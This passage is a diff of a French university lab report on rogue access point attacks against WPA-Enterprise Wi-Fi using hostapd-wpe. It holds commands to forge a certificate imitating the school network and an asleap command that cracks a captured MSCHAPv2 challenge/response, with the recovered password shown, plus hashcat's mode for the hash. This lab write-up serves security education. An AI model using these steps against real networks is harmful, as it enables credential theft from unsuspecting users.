@@ -269,19 +269,52 @@ Pour implémenter l’attaque :
 
 > **_Question :_** Quelles modifications sont nécessaires dans la configuration de hostapd-wpe pour cette attaque ?
 > 
-> **_Réponse :_** 
+> **_Réponse :_** Les champs relatifs au 802.11 càd `ssid` et `channel` (les adapter au réseau que l'on souhaite imiter).
+
+Nous avons pris soin de créer un certificat plus approprié à l'aide de l'outil `apd_launchpad.py` :
+
+```
+python apd_launchpad.py -t HEIG-VD -s HEIG-XD -i wlan0 -cn HEIG.VD
+```
+voici à quoi le certificat ressemble sur le device se connectant :
+
+![](./img/IOS_Certif_HEIG.PNG)
+
+Vous trouverez tout les fichiers générés par l'outil [ici](./files/HEIG-VD/)
 
 ---
 
 > **_Question:_** Quel type de hash doit-on indiquer à john ou l'outil que vous avez employé pour craquer le handshake ?
 > 
-> **_Réponse:_** 
+> **_Réponse:_** Dans notre cas nous avons fait usage de l'outil [asleap](https://www.kali.org/tools/asleap/) :
+
+```
+asleap -C 00:8f:09:ce:08:f8:7f:c1 -R c5:24:d3:41:51:cd:5c:05:b2:ad:e3:84:76:c3:e2:9a:79:ed:d5:c3:c5:ce:cf:26 -W /usr/share/wordlists/rockyou.txt 
+asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
+Using wordlist mode with "/usr/share/wordlists/rockyou.txt".
+	hash bytes:       eff6
+	NT hash:          e24106942bf38bcf57a6a4b29016eff6
+	password:         buttercup
+
+```
+Cet outil prends le `challenge` -C et la `reponse` -R issus de la sortie de `hostapd-wpe` et une wordlist (rockyou.txt)
+
+Après quelques recherches, il semblerait que pour hashcat il faille utilisé l'argument -m 5500 correspondant au hashtype "5500	NetNTLMv1 / NetNTLMv1+ESS" [selon leur doc](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
 ---
 
 > **_Question:_** Quelles méthodes d’authentification sont supportées par hostapd-wpe ?
 > 
-> **_Réponse:_**
+> **_Réponse:_** Selon la [doc fournit sur le repo](https://github.com/OpenSecurityResearch/hostapd-wpe) :
+
+Hostapd-wpe supporte :
+
+    1. EAP-FAST/MSCHAPv2 (Phase 0)
+    2. PEAP/MSCHAPv2
+    3. EAP-TTLS/MSCHAPv2
+    4. EAP-TTLS/MSCHAP
+    5. EAP-TTLS/CHAP
+    6. EAP-TTLS/PAP
 
 
 ### 3. En option, vous pouvez explorer d'autres outils comme [eapeak](https://github.com/rsmusllp/eapeak) ou [crEAP](https://github.com/W9HAX/crEAP/blob/master/crEAP.py) pour les garder dans votre arsenal de pentester.
